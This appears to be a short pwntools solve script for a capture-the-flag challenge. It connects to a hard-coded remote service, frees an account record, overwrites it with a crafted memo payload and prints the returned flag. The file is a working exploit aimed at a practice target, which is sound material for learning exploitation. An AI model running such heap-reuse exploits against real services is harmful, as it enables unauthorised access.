from pwn import * 

def new_account():

	global p

	p.recvuntil("number: ")
	p.sendline("1")
	
	p.recvuntil("name: ")
	p.sendline("A" * 35)

	p.recvuntil("name: ")
	p.sendline("B" * 35)

def remove_account():

	global p 

	p.recvuntil("number: ")
	p.sendline("3")
	p.recv()

def add_memo():

	global p 

	p.recvuntil("number: ")
	p.sendline("4")
	p.recv()
	p.recv()

	p.sendline("A" * 64 + 'fuck' + 'B' * 4)

def print_flag():

	global p

	p.recvuntil("number: ")
	p.sendline("5")
	p.recv()
	flag = p.recv()
	print(flag)

def main():

	global p 
	host = "206.189.17.217"
	port = 32297

	p = remote(host, port)

	new_account()
	remove_account()
	add_memo()
	print_flag()

if __name__ == "__main__":

	main()